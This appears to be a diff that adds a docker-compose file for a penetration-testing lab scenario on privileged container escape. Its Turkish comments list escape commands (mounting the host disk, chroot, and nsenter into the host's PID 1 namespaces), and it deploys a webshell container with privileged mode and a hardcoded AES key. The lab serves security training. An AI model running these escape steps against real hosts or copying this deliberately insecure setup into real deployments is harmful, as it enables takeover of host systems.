@@ -1,0 +1,22 @@
+# Senaryo 1: Privileged Container Escape
+# Saldiri vektoru:
+#   - fdisk -l                                    -> host diskleri listele
+#   - mount /dev/sda1 /mnt                        -> host filesystem mount
+#   - chroot /mnt                                 -> host'a escape
+#   - nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
+#                                                 -> host namespace'ine gecis
+
+services:
+  webshell-privileged:
+    build:
+      context: .
+      dockerfile: Dockerfile
+    image: pentest-webshell:latest
+    container_name: pentest-privileged
+    hostname: pentest-node
+    privileged: true
+    ports:
+      - "8081:8080"
+    environment:
+      - WEBSHELL_AES_KEY=a3f1b9c4d7e2f058619a4b7c8d0e1f2a3b4c5d6e7f80910a1b2c3d4e5f607180
+    restart: unless-stopped
